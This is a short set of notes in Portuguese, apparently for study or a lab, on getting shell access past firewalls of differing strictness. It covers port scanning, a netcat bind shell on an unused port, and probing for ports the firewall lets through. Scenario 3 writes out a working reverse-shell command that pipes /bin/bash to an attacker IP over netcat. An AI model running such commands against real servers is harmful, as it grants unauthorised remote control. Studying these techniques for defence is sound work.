Cenário 2
	Em um servidor com firewall mal configurado é possivel fazer um portscan e verificar quais portas estão com serviços ativos.
	No caso do cenário 1 o servidor tem 4 portas abertas mas 3 estão com serviços ativos e uma está com serviço desativado, nessas portas com serviços ativos não é possivel fazer um bind shell pois a porta já está em uso, porem a ultima porta não está sendo usada, logo é possivel abrir a porta com o netcat e fazer um binshell mandando o bash na porta não usada.

Cenário 3
	O servidor tem um firewall bem configurado e bloqueia qualquer trafego de entrada, logo mesmo que eu abra uma porta eu não consigo me conectar a ela, mas é possivel fazer um Revese Shell onde eu abro a porta 5050 na minha maquina e no servidor com o firewall eu me conecto a porta mandando o /bin/bash pelo netcat( nc -vn 172.20.1.77 5050 -e /bin/bash )

Cenário 4
	O firewall mais restritivo não permite trafego de entrada nem de saida, logo não funciona bindshell nem reverse shell. Foi criado um script que abre varias portas no servidor com o firewall e na maquina do atacante foi criado outro script que tenta conectar em cada porta aberta no servidor e retornar só as portas que foram feito a conexão para saber quais portas permitem acesso. dessa forma é possivel saber qual porta o firewall permite trafego para fazer um reverse shell.
	 Em casos avançados os scripts podem ser feitos para testar todos os tipos de conexões como tcp, udp, icmp e tudo que pode permitir saida.
	 